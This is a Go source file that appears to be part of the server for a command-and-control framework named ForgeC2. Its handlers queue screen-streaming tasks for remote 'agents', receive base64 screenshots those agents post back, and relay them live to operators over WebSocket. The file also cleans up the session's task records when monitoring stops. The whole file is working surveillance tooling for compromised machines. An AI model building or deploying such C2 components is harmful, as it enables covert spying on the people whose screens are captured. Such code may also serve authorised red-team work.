package server

import (
	"bytes"
	"fmt"
	"html/template"
	"log/slog"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

var screenMonitorAgents = make(map[string]time.Time)
var screenMonitorMu sync.Mutex

func (s *Server) handleScreenMonitorPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	data := gin.H{
		"Title":     "ForgeC2 - 屏幕监控",
		"Agent":     agent,
		"ActiveNav": "agents",
		"Online":    s.cfg.Auth.PasswordHash != "",
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "screen_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())

	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleStartScreenMonitor(c *gin.Context) {
	id := c.Param("id")

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Screen monitor: agent not found", "agent_id", id, "err", err)
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	screenMonitorMu.Lock()
	screenMonitorAgents[strings.ToLower(id)] = time.Now()
	screenMonitorMu.Unlock()

	task := db.Task{
		AgentID: id,
		Type:    "screen_stream_start",
		Status:  "pending",
	}
	if result := s.db.Create(&task); result.Error != nil {
		slog.Error("Screen monitor: failed to create task", "agent_id", id, "err", result.Error)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "screen_monitor_start", "agent", id, "Started screen monitoring", true, nil)
	slog.Info("Screen monitoring started", "agent", id, "task_id", task.ID)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "Screen stream started"})
}

func (s *Server) handleStopScreenMonitor(c *gin.Context) {
	id := c.Param("id")

	screenMonitorMu.Lock()
	startTime, ok := screenMonitorAgents[strings.ToLower(id)]
	delete(screenMonitorAgents, strings.ToLower(id))
	screenMonitorMu.Unlock()

	// Auto clean up placeholder/monitoring tasks generated during this session
	// (stop task kept briefly to reach agent, deleted on ack in beacon)
	if ok {
		s.db.Where("agent_id = ? AND created_at >= ? AND type IN (?)", id, startTime,
			[]string{"screenshot", "screen_stream_start"}).
			Delete(&db.Task{})
	}

	// send stop to agent
	task := db.Task{
		AgentID: id,
		Type:    "screen_stream_stop",
		Status:  "pending",
	}
	s.db.Create(&task)

	s.LogAuditRecord(c, "screen_monitor_stop", "agent", id, "Stopped screen monitoring", true, nil)
	slog.Info("Screen monitoring stopped", "agent", id)
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func IsScreenMonitoring(agentID string) bool {
	screenMonitorMu.Lock()
	defer screenMonitorMu.Unlock()
	_, ok := screenMonitorAgents[agentID]
	if ok {
		return true
	}
	_, ok = screenMonitorAgents[strings.ToLower(agentID)]
	if ok {
		return true
	}
	_, ok = screenMonitorAgents[strings.ToUpper(agentID)]
	if ok {
		return true
	}
	return false
}

func (s *Server) BroadcastScreenshot(agentID string, base64Data string) {
	message := fmt.Sprintf(`{"type":"screenshot","agent_id":"%s","data":"%s"}`, agentID, base64Data)

	s.wsMutex.Lock()
	defer s.wsMutex.Unlock()

	for conn := range s.wsClients {
		if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
			slog.Error("Failed to send screenshot via WebSocket", "err", err)
		}
	}
}

func (s *Server) handleScreenFrame(c *gin.Context) {
	var req struct {
		UUID string `json:"uuid"`
		Data string `json:"data"` // base64 encoded jpeg/png
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
		return
	}
	if req.UUID == "" || req.Data == "" {
		c.JSON(http.StatusOK, gin.H{"ok": true})
		return
	}

	if IsScreenMonitoring(req.UUID) {
		// Live monitoring: broadcast only, never save to disk
		s.BroadcastScreenshot(req.UUID, req.Data)
	}

	c.JSON(http.StatusOK, gin.H{"ok": true})
}
